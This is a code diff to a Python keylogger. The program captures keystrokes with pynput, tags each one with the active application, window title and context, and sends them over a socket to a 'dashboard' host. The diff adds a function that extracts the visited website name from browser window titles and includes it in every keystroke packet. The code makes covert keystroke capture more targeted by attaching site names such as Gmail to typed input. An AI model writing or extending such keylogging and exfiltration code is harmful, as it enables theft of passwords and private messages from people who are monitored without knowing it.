@@ -29,7 +29,7 @@ import psutil
 from pynput import keyboard
 
 # ── Config ──────────────────────────────────────────────────
-DASHBOARD_IP   = "127.0.0.1"   # ← Change for LAN use
+DASHBOARD_IP   = "127.0.0.1" #"192.168.29.44" "127.0.0.1"   # ← Change for LAN use
 DASHBOARD_PORT = 9999
 RECONNECT_DELAY = 4
 # ────────────────────────────────────────────────────────────
@@ -96,7 +96,32 @@ def classify_context(app: str) -> str:
     if any(b in a for b in ["notepad","textedit","kate","geany"]):
         return "Text Editor"
     return "App"
-
+#================== Context classification based on app name ==================
+def extract_website_name(app: str, title: str) -> str:
+    """Extracts the website name from the browser window title."""
+    a = app.lower()
+    # Check if the current app is actually a browser
+    if not any(b in a for b in ["chrome", "firefox", "edge", "safari", "opera", "brave", "msedge"]):
+        return "—" 
+        
+    clean_title = title
+    # 1. Strip the browser name from the end of the title
+    browser_suffixes = [
+        " - Google Chrome", " — Mozilla Firefox", " - Personal - Microsoft​ Edge", 
+        " - Microsoft Edge", " - Brave", " - Opera"
+    ]
+    for suffix in browser_suffixes:
+        if clean_title.endswith(suffix):
+            clean_title = clean_title[:-len(suffix)] # Remove the suffix
+            
+    # 2. Extract the website name (usually the last part after a dash)
+    # Example: "Inbox (12) - user@email.com - Gmail" -> We want "Gmail"
+    parts = clean_title.split(" - ")
+    if len(parts) > 1:
+        return parts[-1].strip()
+    
+    # Fallback if there are no dashes
+    return clean_title.strip()
 
 # ── Socket send ──────────────────────────────────────────────
 def send_packet(packet: dict):
@@ -164,6 +189,7 @@ def start_keylogger():
 
         app, title = get_active_window()
         context    = classify_context(app)
+        website    = extract_website_name(app, title)
 
         send_packet({
             "type": "keystroke",
@@ -173,6 +199,7 @@ def start_keylogger():
                 "app":      app,
                 "title":    title,
                 "context":  context,
+                "website":  website,
                 "ts":       time.strftime("%H:%M:%S"),
             }
         })
